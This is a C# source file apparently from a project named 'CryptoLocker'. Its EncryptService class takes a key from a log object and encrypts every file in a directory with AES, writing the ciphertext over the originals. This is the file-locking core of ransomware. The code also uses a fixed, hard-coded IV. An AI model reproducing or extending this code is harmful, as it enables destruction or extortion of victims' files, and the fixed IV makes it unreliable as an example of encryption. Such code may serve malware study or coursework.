using CryptoLocker.Abstractions;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Runtime.Intrinsics.Arm;
using System.Text;
using System.Threading.Tasks;
using Aes = System.Security.Cryptography.Aes;
using CryptoLocker.Models;

namespace CryptoLocker.Implements
{
    public class EncryptService : IEncryptService
    {
        private readonly Log _key;
        public EncryptService(Log key)
        {
            _key = key;
        }
        public void Encrypt(string directoryPath)
        {
            using var crypt = Aes.Create();
            crypt.Key = _key.HashKey;
            var iv = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
            crypt.IV = iv;
            crypt.Padding = PaddingMode.PKCS7;
            foreach (var path in GetFilesPath(directoryPath))
            {
                EncryptStream(GetStream(path), crypt);
            }
        }
        private FileStream GetStream(string path) => new FileStream(path, FileMode.Open);
        private void EncryptStream(FileStream fileStream, SymmetricAlgorithm algorithm)
        {
            using var cryptoStream = new CryptoStream(fileStream, algorithm.CreateEncryptor(), CryptoStreamMode.Write);
            var bytes = GetContent(fileStream);
            fileStream.Seek(0, SeekOrigin.Begin);
            cryptoStream.Write(bytes, 0, bytes.Length);
        }
        private byte[] GetContent(FileStream stream)
        {
            var bytes = new byte[stream.Length];
            stream.Read(bytes, 0, bytes.Length);
            return bytes;
        }
        private string[] GetFilesPath(string directoryPath) => Directory.GetFiles(directoryPath);

    }
}
